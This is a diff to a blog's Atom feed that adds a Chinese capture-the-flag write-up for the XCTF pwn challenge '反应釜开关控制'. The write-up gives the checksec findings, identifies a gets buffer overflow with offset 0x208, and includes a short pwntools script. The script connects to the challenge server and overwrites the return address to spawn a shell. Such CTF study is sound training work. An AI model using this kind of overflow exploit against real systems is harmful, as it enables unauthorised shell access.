@@ -228,6 +228,28 @@
   </entry>
   
   <entry>
+    <title>攻防世界-pwn-反应釜开关控制</title>
+    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/"/>
+    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/</id>
+    <published>2022-08-09T03:17:04.181Z</published>
+    <updated>2020-11-13T04:11:02.014Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p><ul><li>可以修改GOT表</li><li>可以通过一处的方式来更改程序运行流</li><li>堆栈不可执行</li><li>地址随机化未开启</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p><p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p><p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p><p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p><p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec:&quot;&gt;&lt;/a&gt;checksec:&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/07/15/3D5q</summary>
+      
+    
+    
+    
+    
+    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
     <title>WinDbg使用整理</title>
     <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/"/>
     <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/</id>
